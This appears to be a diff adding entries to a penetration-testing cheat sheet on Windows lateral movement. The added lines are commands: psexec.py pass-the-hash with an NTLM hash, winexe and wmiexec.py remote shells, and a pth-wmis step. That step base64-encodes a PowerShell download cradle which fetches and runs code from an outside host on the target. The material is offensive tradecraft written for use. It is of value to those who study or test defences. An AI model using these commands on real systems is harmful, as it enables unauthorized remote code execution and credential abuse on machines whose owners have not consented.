@@ -28,6 +28,10 @@ net view \\machine-name /all
 - psexec.py - https://github.com/CoreSecurity/impacket
 
 ```
+/opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.10
+```
+
+```
 PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software
 ```
 ```
@@ -66,6 +70,10 @@ sc \\machine start serviceName
 ### Winexe
 - https://sourceforge.net/projects/winexe/
 
+```
+winexe -U Administrator //10.10.10.82 cmd.exe
+```
+
 #### Pass the hash
 ```
 pth-winexe
@@ -76,6 +84,12 @@ pth-winexe
 ### wmiexec.py
 - Windows Management Instrumentation (WMI) to launch a semi-interactive shell.
 - WMI is the infrastructure for management data and operations on Windows (like SNMP).
+- without touching disk or creating a new service.
+
+
+```
+wmiexec.py administrator:password@10.10.10.10
+```
 ```
 wmic computerystem list full /format:list  
 wmic process list /format:list  
@@ -111,6 +125,16 @@ wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire
     - CrackMapExec
     - wmiexec.py
     - wmis
+
+### pth-wmis
+
+pth-wmis doesn’t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running.
+
+```
+echo "iex (New-Object Net.WebClient).DownloadString('http://172.16.67.128:80/6WcepYO')" | iconv --to-code UTF-16LE | base64 -w 0
+kaliwmis-32 -U administrator%badpassword //10.10.10.10 "cmd.exe /c  powershell.exe -nop -enc <base64-value>"
+```
+
 
 ### Windows Remote Management (WinRM)
 - 5985/tcp (HTTP) / 5986/tcp (HTTPS)
